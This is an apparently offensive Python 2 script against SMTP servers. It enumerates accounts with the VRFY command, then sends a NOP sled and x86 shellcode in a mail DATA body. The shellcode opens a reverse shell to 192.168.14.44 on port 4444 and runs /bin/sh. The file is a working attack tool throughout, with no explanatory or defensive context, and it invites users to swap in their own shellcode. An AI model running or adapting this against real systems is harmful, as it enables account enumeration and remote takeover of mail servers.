#!/usr/bin/env python
import socket
import sys


__author__ = 'mannea'

if len(sys.argv) != 3:
    print "Usage: null_smtp <ip address> <string>"
    sys.exit(0)

address = sys.argv[1]
name = sys.argv[2]

null_bytes = ""
null_bytes += "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
null_bytes += "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
null_bytes += "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"


# Make sure to get your own shellcode for the buffer
buf = ""
buf += "\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66"
buf += "\xcd\x80\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x68\xc0"
buf += "\xa8\x0e\x2c\x68\x02\x00\x11\x5c\x89\xe1\xb0\x66\x50"
buf += "\x51\x53\xb3\x03\x89\xe1\xcd\x80\x52\x68\x2f\x2f\x73"
buf += "\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xb0"
buf += "\x0b\xcd\x80"

payload = null_bytes + buf

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = sock.connect((address, 25))
banner = sock.recv(1024)
print(banner)
sock.send('HELO null.org \r\n')
result = sock.recv(1024)
print(result)
sock.send('VRFY ' + name.strip() + '\r\n')
result = sock.recv(1024)
print(result)
if ("not implemented" in result) or ("disallowed" in result):
    sys.exit("INFO: VRFY Command not implemented on " + sys.argv[1])
if (("250" in result) or ("252" in result) and ("Cannot VRFY" not in result)):
    print "[*] SMTP VRFY Account found on " + sys.argv[1] + ": " + name.strip()


#
#
sock.send('MAIL FROM: nx00@null.org \r\n')
result = sock.recv(1024)
print(result)
sock.send('RCPT TO: ' + name.strip() + ' \r\n')
result = sock.recv(1024)
print(result)
sock.send('DATA \r\n')
result = sock.recv(1024)
print(result)

# sock.send('SUBJECT: Did you get the null byte? \r\n')
# sock.send('\r\n')
# sock.send('\r\n')
# sock.send('Hi there \r\n')
# sock.send('\r\n')
sock.send(payload + '\r\n')
sock.send('.\r\n')
result = sock.recv(1024)
print(result)


# DATA
# SUBJECT: [your subject here]

# .


sock.close()